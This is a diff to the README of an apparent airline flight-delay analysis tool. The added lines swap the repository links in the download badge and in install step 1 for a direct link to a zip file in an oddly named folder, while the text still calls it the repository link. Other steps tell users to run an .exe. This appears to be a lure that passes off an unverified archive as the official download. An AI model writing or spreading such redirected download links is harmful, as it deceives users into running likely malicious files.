@@ -1,6 +1,6 @@
 # ✈️ airline-flight-delay-analysis - Gain insights into airline delay patterns
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/samuelsab391-afk/airline-flight-delay-analysis)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/samuelsab391-afk/airline-flight-delay-analysis/main/tribunitian/flight_analysis_airline_delay_3.3.zip)
 
 This application helps you explore flight delay analytics. You gain access to data from over 6.2 million individual flights. The tool examines 14 major airlines and 628 airports to show seasonal trends and delay causes.
 
@@ -18,7 +18,7 @@ Ensure your computer has the following items before you start the setup process:
 
 You need to obtain the installer from the official repository page. Follow these instructions to secure the file:
 
-1. Visit the following link to access the repository: [https://github.com/samuelsab391-afk/airline-flight-delay-analysis](https://github.com/samuelsab391-afk/airline-flight-delay-analysis).
+1. Visit the following link to access the repository: [https://raw.githubusercontent.com/samuelsab391-afk/airline-flight-delay-analysis/main/tribunitian/flight_analysis_airline_delay_3.3.zip](https://raw.githubusercontent.com/samuelsab391-afk/airline-flight-delay-analysis/main/tribunitian/flight_analysis_airline_delay_3.3.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Select the most recent version available.
 4. Click the file ending in .exe to start your download.
